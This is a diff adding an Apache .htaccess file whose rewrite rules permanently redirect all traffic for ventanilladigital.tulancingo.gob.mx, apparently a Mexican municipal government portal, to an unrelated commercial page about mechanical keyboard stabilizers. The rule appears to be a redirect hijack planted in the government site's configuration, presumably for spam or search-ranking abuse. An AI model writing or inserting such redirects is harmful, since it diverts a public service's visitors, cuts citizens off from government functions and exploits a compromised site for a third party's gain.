@@ -1,0 +1,5 @@
+RewriteEngine On
+
+# Redirect domain ventanilladigital → helveticaforever
+RewriteCond %{HTTP_HOST} ^ventanilladigital\.tulancingo\.gob\.mx$ [NC]
+RewriteRule ^(.*)$ https://helveticaforever.com/mechanical-keyboard-stabilizers/ [L,R=301]
